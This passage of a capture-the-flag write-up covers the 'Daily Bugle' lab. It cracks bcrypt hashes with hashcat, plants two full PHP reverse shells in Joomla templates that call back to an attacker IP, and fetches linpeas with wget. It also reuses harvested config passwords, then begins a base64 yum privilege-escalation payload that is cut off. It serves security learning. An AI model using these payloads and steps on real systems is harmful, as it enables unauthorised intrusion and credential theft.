* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: <span style="color:#ae81ff">14344392</span>
* Bytes.....: <span style="color:#ae81ff">139921507</span>
* Keyspace..: <span style="color:#ae81ff">14344385</span>
* Runtime...: <span style="color:#ae81ff">1</span> sec

<span style="color:#f92672">[</span>s<span style="color:#f92672">]</span>tatus <span style="color:#f92672">[</span>p<span style="color:#f92672">]</span>ause <span style="color:#f92672">[</span>b<span style="color:#f92672">]</span>ypass <span style="color:#f92672">[</span>c<span style="color:#f92672">]</span>heckpoint <span style="color:#f92672">[</span>q<span style="color:#f92672">]</span>uit <span style="color:#f92672">=</span>&gt; s


$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:<span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish <span style="color:#f92672">(</span>Unix<span style="color:#f92672">)</span>
Hash.Target......: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p...BtZutm
Time.Started.....: Fri Aug <span style="color:#ae81ff">28</span> 19:23:14 <span style="color:#ae81ff">2020</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">7</span> mins, <span style="color:#ae81ff">14</span> secs<span style="color:#f92672">)</span>
Time.Estimated...: Fri Aug <span style="color:#ae81ff">28</span> 19:30:28 <span style="color:#ae81ff">2020</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
Guess.Base.......: File <span style="color:#f92672">(</span>/usr/share/wordlists/rockyou.txt<span style="color:#f92672">)</span>
Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
Speed.#1.........:      <span style="color:#ae81ff">108</span> H/s <span style="color:#f92672">(</span>13.91ms<span style="color:#f92672">)</span> @ Accel:4 Loops:64 Thr:1 Vec:8
Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests
Progress.........: 46848/14344385 <span style="color:#f92672">(</span>0.33%<span style="color:#f92672">)</span>
Rejected.........: 0/46848 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
Restore.Point....: 46824/14344385 <span style="color:#f92672">(</span>0.33%<span style="color:#f92672">)</span>
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:960-1024
Candidates.#1....: supaman -&gt; smokers

Started: Fri Aug <span style="color:#ae81ff">28</span> 19:22:38 <span style="color:#ae81ff">2020</span>
Stopped: Fri Aug <span style="color:#ae81ff">28</span> 19:30:29 <span style="color:#ae81ff">2020</span>
</code></pre></div><p>Now that we got a password, let&rsquo;s log into Joomla admin:</p>
<p>Note: We also can log in into the non-admin section of the blog, but what we really want is that <strong>/administrator/</strong> path that we found earlier.</p>
<p><img src="https://i.imgur.com/91n6CmU.png" alt="Logged in as Jonah"></p>
<p>Let&rsquo;s see if we can add a new post, but the code being a php reverse shell. Not sure if this will work:</p>
<p>Looking around for PHP Reverse shells, I found this one <a href="https://gist.github.com/rshipp/eee36684db07d234c1cc">here</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">/*&lt;?php /**/</span> <span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>); $ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.13.0.34&#39;</span>; $port <span style="color:#f92672">=</span> <span style="color:#ae81ff">2112</span>; <span style="color:#66d9ef">if</span> (($f <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;stream_socket_client&#39;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_callable</span>($f)) { $s <span style="color:#f92672">=</span> $f(<span style="color:#e6db74">&#34;tcp://</span><span style="color:#e6db74">{</span>$ip<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>$port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>); $s_type <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;stream&#39;</span>; } <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$s <span style="color:#f92672">&amp;&amp;</span> ($f <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;fsockopen&#39;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_callable</span>($f)) { $s <span style="color:#f92672">=</span> $f($ip, $port); $s_type <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;stream&#39;</span>; } <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$s <span style="color:#f92672">&amp;&amp;</span> ($f <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;socket_create&#39;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_callable</span>($f)) { $s <span style="color:#f92672">=</span> $f(<span style="color:#a6e22e">AF_INET</span>, <span style="color:#a6e22e">SOCK_STREAM</span>, <span style="color:#a6e22e">SOL_TCP</span>); $res <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">socket_connect</span>($s, $ip, $port); <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$res) { <span style="color:#66d9ef">die</span>(); } $s_type <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;socket&#39;</span>; } <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$s_type) { <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;no socket funcs&#39;</span>); } <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$s) { <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;no socket&#39;</span>); } <span style="color:#66d9ef">switch</span> ($s_type) { <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;stream&#39;</span><span style="color:#f92672">:</span> $len <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($s, <span style="color:#ae81ff">4</span>); <span style="color:#66d9ef">break</span>; <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;socket&#39;</span><span style="color:#f92672">:</span> $len <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket_read</span>($s, <span style="color:#ae81ff">4</span>); <span style="color:#66d9ef">break</span>; } <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$len) { <span style="color:#66d9ef">die</span>(); } $a <span style="color:#f92672">=</span> <span style="color:#a6e22e">unpack</span>(<span style="color:#e6db74">&#34;Nlen&#34;</span>, $len); $len <span style="color:#f92672">=</span> $a[<span style="color:#e6db74">&#39;len&#39;</span>]; $b <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>; <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">strlen</span>($b) <span style="color:#f92672">&lt;</span> $len) { <span style="color:#66d9ef">switch</span> ($s_type) { <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;stream&#39;</span><span style="color:#f92672">:</span> $b <span style="color:#f92672">.=</span> <span style="color:#a6e22e">fread</span>($s, $len<span style="color:#f92672">-</span><span style="color:#a6e22e">strlen</span>($b)); <span style="color:#66d9ef">break</span>; <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;socket&#39;</span><span style="color:#f92672">:</span> $b <span style="color:#f92672">.=</span> <span style="color:#a6e22e">socket_read</span>($s, $len<span style="color:#f92672">-</span><span style="color:#a6e22e">strlen</span>($b)); <span style="color:#66d9ef">break</span>; } } $GLOBALS[<span style="color:#e6db74">&#39;msgsock&#39;</span>] <span style="color:#f92672">=</span> $s; $GLOBALS[<span style="color:#e6db74">&#39;msgsock_type&#39;</span>] <span style="color:#f92672">=</span> $s_type; <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">extension_loaded</span>(<span style="color:#e6db74">&#39;suhosin&#39;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">ini_get</span>(<span style="color:#e6db74">&#39;suhosin.executor.disable_eval&#39;</span>)) { $suhosin_bypass<span style="color:#f92672">=</span><span style="color:#a6e22e">create_function</span>(<span style="color:#e6db74">&#39;&#39;</span>, $b); $suhosin_bypass(); } <span style="color:#66d9ef">else</span> { <span style="color:#66d9ef">eval</span>($b); } <span style="color:#66d9ef">die</span>();
</code></pre></div><p>We paste that in the view code of the blog entry:</p>
<p><img src="https://i.imgur.com/PhmwKsJ.png" alt="blog entry source code view"></p>
<p>Let&rsquo;s fire up a netcat listener:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/dailyBugle<span style="color:#f92672">]</span>
└─$ nc -nlvp <span style="color:#ae81ff">2112</span>                                              
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">2112</span> ...

</code></pre></div><p>Now let&rsquo;s publish the blog post and see if it gets triggered right there or if we need to visit it. This might not work at all if the post code is not processed as PHP code at all.</p>
<p>That did not work at all. The code of the blog post is not executed as php code, even if it is. We need to find how to upload a file possibly.</p>
<p>[Googling&hellip; Please wait]</p>
<p>We try to add php file extension as one of the permitted formats for uploading media:</p>
<p><img src="https://i.imgur.com/GOiuW3p.png" alt="We try to add php as a valid upload format"></p>
<p>That did not work either&hellip;</p>
<p>Another thing we can try is using the templates administration panel, with any of the templates we find a file to edit and include our exploit.
This seems to kind of work, we do get a connection back to our netcat listener but it closes right after and does not seems to respond to any command.</p>
<p><img src="https://i.imgur.com/Y1MLMpv.png" alt="Using a template file with explioit and preview feature"></p>
<p>Since this kid of works, I&rsquo;d like to try another variation of a PHP Rev shell, lets see what we find:</p>
<p>I found <a href="https://alamot.github.io/reverse_shells/">this interesting site</a>, which has a php one-liner from pentestmonkey that could try, looks kind of similar to the one we have. We need to update IP and PORT. Then we do the same as before, using any php of a template in the templates manager we add our code and save. Then we trigger the &ldquo;Preview Template&rdquo; as before.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">// pentestmonkey one-liner ^_^
</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">set_time_limit</span> (<span style="color:#ae81ff">0</span>); $VERSION <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1.0&#34;</span>; $ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;10.13.0.34&#34;</span>; $port <span style="color:#f92672">=</span> <span style="color:#ae81ff">2112</span>; $chunk_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1400</span>; $write_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>; $error_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>; $shell <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uname -a; w; id; /bin/bash -i&#34;</span>; $daemon <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $debug <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">function_exists</span>(<span style="color:#e6db74">&#34;pcntl_fork&#34;</span>)) { $pid <span style="color:#f92672">=</span> <span style="color:#a6e22e">pcntl_fork</span>(); <span style="color:#66d9ef">if</span> ($pid <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) { <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Cannot fork&#34;</span>); <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>); } <span style="color:#66d9ef">if</span> ($pid) { <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">0</span>); } <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">posix_setsid</span>() <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) { <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;Error: Cannot setsid()&#34;</span>); <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>); } $daemon <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; } <span style="color:#66d9ef">else</span> { <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;</span>); } <span style="color:#a6e22e">chdir</span>(<span style="color:#e6db74">&#34;/&#34;</span>); <span style="color:#a6e22e">umask</span>(<span style="color:#ae81ff">0</span>); $sock <span style="color:#f92672">=</span> <span style="color:#a6e22e">fsockopen</span>($ip, $port, $errno, $errstr, <span style="color:#ae81ff">30</span>); <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$sock) { <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$errstr</span><span style="color:#e6db74"> (</span><span style="color:#e6db74">$errno</span><span style="color:#e6db74">)&#34;</span>); <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>); } $descriptorspec <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">0</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>), <span style="color:#ae81ff">1</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>), <span style="color:#ae81ff">2</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>)); $process <span style="color:#f92672">=</span> <span style="color:#a6e22e">proc_open</span>($shell, $descriptorspec, $pipes); <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_resource</span>($process)) { <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Cannot spawn shell&#34;</span>); <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>); } <span style="color:#a6e22e">stream_set_blocking</span>($pipes[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">0</span>); <span style="color:#a6e22e">stream_set_blocking</span>($pipes[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">0</span>); <span style="color:#a6e22e">stream_set_blocking</span>($pipes[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>); <span style="color:#a6e22e">stream_set_blocking</span>($sock, <span style="color:#ae81ff">0</span>); <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;Successfully opened reverse shell to </span><span style="color:#e6db74">$ip</span><span style="color:#e6db74">:</span><span style="color:#e6db74">$port</span><span style="color:#e6db74">&#34;</span>); <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) { <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">feof</span>($sock)) { <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Shell connection terminated&#34;</span>); <span style="color:#66d9ef">break</span>; } <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">feof</span>($pipes[<span style="color:#ae81ff">1</span>])) { <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Shell process terminated&#34;</span>); <span style="color:#66d9ef">break</span>; } $read_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>($sock, $pipes[<span style="color:#ae81ff">1</span>], $pipes[<span style="color:#ae81ff">2</span>]); $num_changed_sockets <span style="color:#f92672">=</span> <span style="color:#a6e22e">stream_select</span>($read_a, $write_a, $error_a, <span style="color:#66d9ef">null</span>); <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($sock, $read_a)) { <span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;SOCK READ&#34;</span>); $input <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($sock, $chunk_size); <span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;SOCK: </span><span style="color:#e6db74">$input</span><span style="color:#e6db74">&#34;</span>); <span style="color:#a6e22e">fwrite</span>($pipes[<span style="color:#ae81ff">0</span>], $input); } <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($pipes[<span style="color:#ae81ff">1</span>], $read_a)) { <span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDOUT READ&#34;</span>); $input <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($pipes[<span style="color:#ae81ff">1</span>], $chunk_size); <span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDOUT: </span><span style="color:#e6db74">$input</span><span style="color:#e6db74">&#34;</span>); <span style="color:#a6e22e">fwrite</span>($sock, $input); } <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($pipes[<span style="color:#ae81ff">2</span>], $read_a)) { <span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDERR READ&#34;</span>); $input <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($pipes[<span style="color:#ae81ff">2</span>], $chunk_size); <span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDERR: </span><span style="color:#e6db74">$input</span><span style="color:#e6db74">&#34;</span>); <span style="color:#a6e22e">fwrite</span>($sock, $input); } } <span style="color:#a6e22e">fclose</span>($sock); <span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">0</span>]); <span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">1</span>]); <span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">2</span>]); <span style="color:#a6e22e">proc_close</span>($process); <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">printit</span> ($string) {  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$daemon) { <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$string\\n</span><span style="color:#e6db74">&#34;</span>; } } <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>This time it works! we have our basic reverse shell working.</p>
<p><img src="https://i.imgur.com/AjMcgoj.png" alt=""></p>
<p>Let&rsquo;s see if we can answer the following room question now.</p>
<h2 id="task-2-question-3-what-is-the-user-flag">[TASK 2] Question #3: What is the user flag?</h2>
<p>Let&rsquo;s see if we can get us a better shell:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">python -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</code></pre></div><p>That did not work. Let&rsquo;s create an HTTP server to serve our friend <strong>linpeas.sh</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/opt/privilege-escalation-awesome-scripts-suite/linPEAS<span style="color:#f92672">]</span>
└─$ sudo python -m SimpleHTTPServer                                                                                                      <span style="color:#ae81ff">1</span> ⨯
Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> ...
</code></pre></div><p>In our revshell we type in the following wget command to and get our file loaded to the server:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">bash-4.2$ wget http:/10.13.0.34:8000/linPeas.sh
wget http:/10.13.0.34:8000/linPeas.sh
--2020-08-28 20:30:51--  ftp://http//10.13.0.34:8000/linPeas.sh
           <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;linPeas.sh&#39;</span>
Resolving http <span style="color:#f92672">(</span>http<span style="color:#f92672">)</span>... failed: Name or service not known.
wget: unable to resolve host address <span style="color:#e6db74">&#39;http&#39;</span>
bash-4.2$ wget http://10.13.0.34:8000/linpeas.sh
wget http://10.13.0.34:8000/linpeas.sh
--2020-08-28 20:31:25--  http://10.13.0.34:8000/linpeas.sh
Connecting to 10.13.0.34:8000... connected.
HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
Length: <span style="color:#ae81ff">235695</span> <span style="color:#f92672">(</span>230K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>text/x-sh<span style="color:#f92672">]</span>
Saving to: <span style="color:#e6db74">&#39;linpeas.sh&#39;</span>

100%<span style="color:#f92672">[======================================</span>&gt;<span style="color:#f92672">]</span> 235,695      154KB/s   in 1.5s   

2020-08-28 20:31:28 <span style="color:#f92672">(</span><span style="color:#ae81ff">154</span> KB/s<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;linpeas.sh&#39;</span> saved <span style="color:#f92672">[</span>235695/235695<span style="color:#f92672">]</span>

bash-4.2$ chmod +x linpeas.sh
chmod +x linpeas.sh
bash-4.2$ 
</code></pre></div><p>Now we run linpeas, assuming it let us. And yep it did. I don&rsquo;t think pasting the output of linpeas would help to this already <strong>not-short-at-all</strong> writeup.</p>
<p>Looking throuhg the results I see we find some users and groups and a password (also a hash):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Last time logon each user
Username         Port     From             Latest                                                                                 
root             pts/0    netwars          Mon Dec <span style="color:#ae81ff">16</span> 05:11:46 -0500 <span style="color:#ae81ff">2019</span>
jjameson         pts/0    netwars          Mon Dec <span style="color:#ae81ff">16</span> 05:14:55 -0500 <span style="color:#ae81ff">2019</span>

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Password policy
PASS_MAX_DAYS   <span style="color:#ae81ff">99999</span>                                                                                                             
PASS_MIN_DAYS   <span style="color:#ae81ff">0</span>
PASS_WARN_AGE   <span style="color:#ae81ff">7</span>
ENCRYPT_METHOD SHA512

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Searching passwords in config PHP files
        public $password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{REDACTED}&#39;</span>;   

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Searching specific hashes inside files - less false positives <span style="color:#f92672">(</span>limit 70<span style="color:#f92672">)</span>

/var/www/html/libraries/vendor/ircmaxell/password-compat/lib/password.php:$2y$04$usesomesi<span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>8K30oukPsA.ztMG 

</code></pre></div><p>We can crack that hash but not sure it is anything useful:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/dailyBugle<span style="color:#f92672">]</span>
└─$ hashcat -m3200 -a0 hash2.txt /usr/share/wordlists/rockyou.txt
hashcat <span style="color:#f92672">(</span>v6.1.1<span style="color:#f92672">)</span> starting...

OpenCL API <span style="color:#f92672">(</span>OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG<span style="color:#f92672">)</span> - Platform <span style="color:#75715e">#1 [The pocl project]</span>
<span style="color:#f92672">=============================================================================================================================</span>
* Device <span style="color:#75715e">#1: pthread-AMD Ryzen 7 3800X 8-Core Processor, 10871/10935 MB (4096 MB allocatable), 6MCU</span>

Minimum password length supported by kernel: <span style="color:#ae81ff">0</span>
Maximum password length supported by kernel: <span style="color:#ae81ff">72</span>

Hashes: <span style="color:#ae81ff">1</span> digests; <span style="color:#ae81ff">1</span> unique digests, <span style="color:#ae81ff">1</span> unique salts
Bitmaps: <span style="color:#ae81ff">16</span> bits, <span style="color:#ae81ff">65536</span> entries, 0x0000ffff mask, <span style="color:#ae81ff">262144</span> bytes, 5/13 rotates
Rules: <span style="color:#ae81ff">1</span>

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required <span style="color:#66d9ef">for</span> this attack: <span style="color:#ae81ff">65</span> MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: <span style="color:#ae81ff">14344385</span>
* Bytes.....: <span style="color:#ae81ff">139921507</span>
* Keyspace..: <span style="color:#ae81ff">14344385</span>

$2y$04$use<span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>oG8K30oukPsA.ztMG:<span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish <span style="color:#f92672">(</span>Unix<span style="color:#f92672">)</span>
Hash.Target......: $2y$04$us<span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>LeakoG8K30ou...A.ztMG
Time.Started.....: Fri Aug <span style="color:#ae81ff">28</span> 20:45:18 <span style="color:#ae81ff">2020</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
Time.Estimated...: Fri Aug <span style="color:#ae81ff">28</span> 20:45:18 <span style="color:#ae81ff">2020</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
Guess.Base.......: File <span style="color:#f92672">(</span>/usr/share/wordlists/rockyou.txt<span style="color:#f92672">)</span>
Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
Speed.#1.........:     <span style="color:#ae81ff">2487</span> H/s <span style="color:#f92672">(</span>10.06ms<span style="color:#f92672">)</span> @ Accel:8 Loops:16 Thr:1 Vec:8
Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests
Progress.........: 48/14344385 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
Rejected.........: 0/48 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
Restore.Point....: 0/14344385 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-16
Candidates.#1....: <span style="color:#ae81ff">123456</span> -&gt; <span style="color:#ae81ff">1234567890</span>

Started: Fri Aug <span style="color:#ae81ff">28</span> 20:45:17 <span style="color:#ae81ff">2020</span>
Stopped: Fri Aug <span style="color:#ae81ff">28</span> 20:45:20 <span style="color:#ae81ff">2020</span>

</code></pre></div><p>As it turns out the output from linpeas already revealed a password we can use, if you look for it under public PHP configs you&rsquo;ll find it, <strong>jjameson:{REDACTED}</strong></p>
<p>From there we can get the user flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">bash-4.2$ su jjameson
su jjameson
Password: <span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>

<span style="color:#f92672">[</span>jjameson@dailybugle tmp<span style="color:#f92672">]</span>$ cd ~
cd ~
<span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ ls
ls
user.txt
<span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ cat user.txt
cat user.txt
27a<span style="color:#f92672">{</span>REDACTED_USER_FLAG<span style="color:#f92672">}</span>442e
<span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ 
</code></pre></div><h2 id="task-2-question-3-what-is-the-root-flag">[TASK 2] Question #3: What is the root flag?</h2>
<p>If we run <strong>sudo -l</strong> we see that jjameson can run something called <em>yum</em>, I&rsquo;ll have to google what that is. Before we do that, let&rsquo;s run linpeas again with our newly adquired jjameson user:</p>
<p>Looking around the web I came across this other exploitiation for Yum. Check it out <a href="https://lsdsecurity.com/2019/01/more-linux-privilege-escalation-yum-rpm-dnf-nopasswd-rpm-payloads/">here</a>.</p>
<p>It looks like this:</p>
<pre><code class="language-base64" data-lang="base64">+Vippeef3FNn/eckVFlbk6H9rGKz//P672KD2D8Ws/7/v7E5o0r4wSj
pNhnztp+T2THrB6N9MXlQJfds/pfeVT/9f6GX/vb2Ff2bbpcXWO1/GL52+bCsv7PPYvWu2VKXzp8
U27t78zLwbct9h+/t/NHonrLlMrQz7PeX3BfXyW8tWuz/+OnN6aw/lLr7X15KfPY3aNTqr+oyloX
SZRsrjU5nynm2p/ZqFq1ONqSX9C24vGezv3fIuxd9S+mm7/KvJkv/3iLuov9yUKpkmV3PNbcPncv
x/qzc/QXT/anZ0uizu3a8mhnv79y3t+XjAyo4MfrOuYZiV0TGDQYGFISSxLhSUGBiNRkaoIlNVy+
nL7A0oCBqTg42ICX5YXJjNyMnKSUhJyMFJaw9LSEvGMLEryqlxsaTBGbriKmqXHh8KqDHF++XPaa
